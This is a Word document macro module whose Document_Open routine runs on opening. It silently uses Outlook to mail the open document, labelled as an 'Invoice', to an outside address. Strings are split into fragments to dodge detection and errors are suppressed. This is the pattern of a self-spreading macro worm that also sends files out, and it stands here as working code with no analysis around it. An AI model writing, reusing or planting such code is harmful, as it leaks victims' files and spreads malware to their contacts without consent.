Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim olApp As Object, olMail As Object
    On Error Resume Next
    Set olApp = CreateObject("Outloo" & "k.Ap" & "plic" & "ation")
    Set olMail = olApp.CreateItem(0)
    olMail.To = "recipient@example.com"
    olMail.Subject = "Invoice"
    olMail.Body = "Please f" & "ind the " & "attached " & "docum" & "ent."
    olMail.Attachments.Add ActiveDocument.FullName
    olMail.Send
End Sub
